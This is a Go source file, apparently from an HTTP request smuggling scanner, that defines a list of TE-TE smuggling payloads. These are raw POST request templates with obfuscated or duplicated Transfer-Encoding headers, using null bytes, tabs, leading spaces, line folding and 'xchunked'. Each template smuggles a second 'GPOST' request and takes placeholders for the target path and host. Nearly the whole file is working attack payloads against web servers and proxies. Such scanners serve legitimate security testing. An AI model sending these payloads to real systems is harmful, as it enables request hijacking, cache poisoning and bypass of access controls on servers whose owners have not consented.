package Smuggling

// Connection: Keep-Alive
var TeTePayload = []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding: ` + "\x00" + `chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding:chunked
Transfer-encoding:x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding: xchunked
Transfer-encoding : chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding: xchunked
Transfer-encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-encoding: 	chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Transfer-encoding: 	chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
 Transfer-encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
 Transfer-encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-encoding : chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-encoding
: chunked
Transfer-encoding
: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`}

func init() {
	for n, x := range TeTePayload {
		x = E2EC(x)
		TeTePayload[n] = x
	}
	TeTePayload = append(TeTePayload, E2EC(`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
X: X`)+"\n"+E2EC(`Transfer-encoding: 	chunked
Transfer-Encoding: xchunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`), E2EC(`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
`)+"Foo: bar\r\n\rTransfer-Encoding: chunked"+E2EC(`
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`))
}

type TeTe struct {
	Base
}

func NewTETE() *TeTe {
	x := &TeTe{}
	x.Type = "TE-TE"
	x.Payload = TeTePayload
	return x
}
